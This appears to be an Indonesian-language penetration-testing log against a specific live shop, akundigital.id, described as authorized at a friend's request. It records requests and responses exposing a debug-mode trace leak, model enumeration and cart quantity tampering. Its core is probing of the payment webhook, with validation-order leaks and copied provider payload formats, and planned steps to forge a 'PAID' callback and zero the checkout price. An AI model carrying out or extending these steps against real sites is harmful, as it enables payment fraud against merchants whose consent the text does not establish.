# Pentest akundigital.id — Laravel + klikqris MY PG (2026-08-23)

Authorized pentest (temen minta dites). Catatan teknis detail dari sesi nyata.

## Stack fingerprint
- Laravel (PHP) + Vite assets `/build/assets/app-*.js`, `app-*.css`
- Cloudflare CDN di depan; hosting CloudLinux shared `/home/robt4485/laravel/`
- Session cookie custom: `akundigitalid-session`; `XSRF-TOKEN` cookie
- WAF: Imunify360 (CloudLinux) — block curl di beberapa endpoint, JS challenge di `/admin`
- Payment gateway: **klikqris.com** mode **MY PG** (QRIS merchant sendiri, dana langsung ke rekening merchant)

## Finding: debug mode ON (HIGH)
```
curl -H "Accept: application/json" https://akundigital.id/api/nonexistent
```
→ JSON lengkap: exception class, file paths (`/home/robt4485/laravel/vendor/laravel/framework/...`), line numbers, full trace. Confirmed info disclosure.

## Finding: model enumeration via NotFoundException
| Path | Error |
|---|---|
| `/kategori/abc` | `No query results for model [App\Models\Category] abc` |
| `/produk/abc` | `No query results for model [App\Models\Product] abc` |
| `/toko/abc` | `No query results for model [App\Models\SellerProfile] abc` |
| `/blog/abc` | `No query results for model [App\Models\Post] abc` |
Route yang gak ada: `The route X could not be found.`

## Finding: cart qty mass assignment
`POST /cart/update` dengan `items[52][qty]=99999` → total Rp 35.000 → **Rp 3.499.965.000**. Qty negatif `-1` → item kehapus dari cart (bukan total negatif). Tidak ada batas atas validasi.

## Finding: direct checkout skip cart
`POST /checkout/{product_id}` (dari form `#directCheckoutForm`) cuma butuh `_token` + `additional_info` → langsung create order:
```
Location: /pay/INV-20260823181344-1PHIYQ   (order #465)
Total: Rp 35.000 + kode unik 363 = Rp 35.363
Status: UNPAID → EXPIRED ±30 menit
```

## Payment page (`/pay/{invoice}`)
- Menampilkan invoice, subtotal, kode unik, total, QRIS image, countdown WIB, chat order
- QRIS image URL: `https://klikqris.com/storage/qris_mypg/qris_{invoice}_{unix_ts}.png`
- `Refresh status` button = `<a href="/pay/{invoice}">` → cuma reload page (bukan endpoint status)

## Webhook endpoint discovery (kunci!)
Probe `POST /webhook/{provider}`:
```
/webhook/klikqris  → 422 "Payload tidak valid."              (route ADA)
/webhook/mypg      → 401 "Merchant ID tidak valid."           (route ADA)
/webhook/my-pg     → 404 "The route webhook/my-pg could not be found." (gak ada)
```

**Validation-order leak** (payload beda → error beda):
```
order_id + status=PAID + amount                → 422 "Payload tidak valid."
+ signature=abc                                → 422 "Metode pembayaran order (MYPG) tidak sesuai dengan webhook endpoint (KLIKQRIS)."
order_id + status=settlement + signature       → 422 "Status pembayaran tidak valid."
merchant_id=1 + ...                            → 401 "Merchant ID tidak valid."
```
Urutan error = urutan validasi: schema → merchant_id → metode → status → (signature).

## Provider docs (klikqris.com/dokumentasi-api) — format asli
**MY PG webhook payload** (yang harus diterima `/webhook/mypg`):
```json
{
  "status": "success",
  "message": "Payment received successfully",
  "data": {
    "order_id": "INV-123456",
    "amount_request": 30000,
    "amount_paid": 30021,
    "payment_date": "2026-01-22 08:44:52",
    "status": "PAID",
    "merchant_id": "MERCHANT_ID_ANDA",
    "via": "QRIS",
    "signature": "8n3v9z...1738681234"
  }
}
```
Signature scheme: "compare signature callback dengan signature response create awal". Auth header: `x-api-key` + `id_merchant`.

**PG KlikQRIS webhook payload**:
```json
{
  "order_id": "DIRECT-176835469862-8460-202601252147",
  "status": "PAID",
  "amount": 1000,
  "total_amount": 1215,
  "payment_date": "2026-01-25 21:48:01",
  "created_at": "2026-01-25 21:47:42",
  "updated_at": "2026-01-25 21:48:01",
  "keterangan": "Pembayaran Paket A",
  "direct_url": "https://klikqris.com/payqris/176835469862/INV-123456",
  "signature": "8n3v9z...1738681234"
}
```
Sandbox: `https://klikqris.com/api/sandbox/qris/create` + public simulator di `/public/sandbox/simulate` (butuh signature dari create response).

## Rate limit & timing
- `POST /checkout/{id}` → 429 `ThrottleRequestsException` setelah beberapa attempt (rate limit ketat)
- Order EXPIRED ±30 menit; bikin order baru harus tunggu rate limit reset

## Belum beres (untuk lanjutan)
1. `/webhook/mypg` butuh `merchant_id` valid + signature asli — merchant id gak ketemu dari page/source (coba: register klikqris gratis → dapet merchant_id sendiri → cek apakah validasi cuma "field ada" bukan "nilai match")
2. `/pay/{invoice}/confirm` route ada (POST) tapi response cuma reload page — parameternya belum ketemu
3. Price manipulation checkout (price=0, total=0) — belum bisa tes karena rate limit; order udah expired
